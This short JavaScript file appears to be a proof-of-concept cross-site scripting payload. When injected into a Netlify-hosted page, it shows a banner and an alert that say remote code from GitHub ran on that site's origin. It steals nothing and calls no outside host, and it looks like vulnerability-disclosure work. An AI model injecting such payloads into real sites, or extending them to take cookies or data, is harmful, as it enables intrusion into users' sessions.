(() => {
  document.documentElement.dataset.netlifyQueryComponentXss = 'executed-file10';

  const existing = document.getElementById('query-component-xss-proof');
  if (existing) existing.remove();

  const proof = document.createElement('div');
  proof.id = 'query-component-xss-proof';
  proof.textContent = `GitHub file10.js executed on ${location.origin}`;
  proof.style.cssText = [
    'position:fixed',
    'inset:16px 16px auto',
    'z-index:2147483647',
    'padding:16px',
    'border:3px solid #f97316',
    'border-radius:12px',
    'background:#111827',
    'color:#fff',
    'font:700 18px system-ui',
    'text-align:center'
  ].join(';');
  document.body.prepend(proof);

  alert(proof.textContent);
})();
